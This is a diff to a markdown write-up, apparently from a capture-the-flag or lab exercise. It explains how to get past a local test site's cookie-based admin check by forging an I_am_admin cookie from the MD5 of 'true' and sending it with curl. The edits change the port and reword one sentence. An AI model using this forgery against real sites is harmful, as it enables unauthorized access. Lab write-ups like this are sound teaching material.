@@ -6,7 +6,7 @@ The application uses client-side cookies for authentication without server-side 
 
 ## Summary
 
-page: `http://localhost:8080/index.php?page=admin`
+page: `http://localhost:8081/index.php?page=admin`
 commands:
 ```bash
 # MD5 of "true"
@@ -19,7 +19,7 @@ curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09"  "http://localhost:8081/in
 
 ## Discovery
 
-During open redirect testing, a redirect to an invalid site sets a suspicious cookie:
+There a suspicious cookie set by the website:
 
 ```txt
 Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
@@ -59,7 +59,7 @@ echo -n "true" | md5sum
 
 ```bash
 curl -i -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
-     "http://localhost:8080/index.php?page=admin"
+     "http://localhost:8081/index.php?page=admin"
 ```
 
 3. Access granted! Returns:
